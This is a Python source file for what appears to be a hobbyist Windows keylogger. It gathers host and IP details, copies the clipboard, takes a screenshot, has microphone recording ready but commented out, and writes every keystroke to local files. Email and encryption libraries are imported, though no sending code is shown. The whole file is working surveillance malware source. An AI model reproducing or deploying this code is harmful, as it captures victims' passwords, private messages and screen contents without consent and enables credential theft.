# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
microphone_time = 10
screenshot_info = "screenshot.png"
screenshot_info1 = "screenshot1.png"

file_path = "C:\\Users\\jonp2\\PycharmProjects\\keylogger\\venv"
extend = "\\"

def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IP_Address = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address : " + publicIP + "\n")
        except Exception:
            f.write("Did not get public IP address" + "\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP: " + IP_Address + "\n")


computer_info()


def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Info: \n" + pasted_data)

        except:
            f.write("Clipboard was not copied")


copy_clipboard()


def microphone():
    freq = 44100
    seconds = microphone_time
    recordings = sd.rec(int(seconds * freq), samplerate=freq, channels=2)
    sd.wait()
    write(file_path + extend + audio_info, freq, recordings)


# microphone()


def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_info1)


screenshot()

count = 0
keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
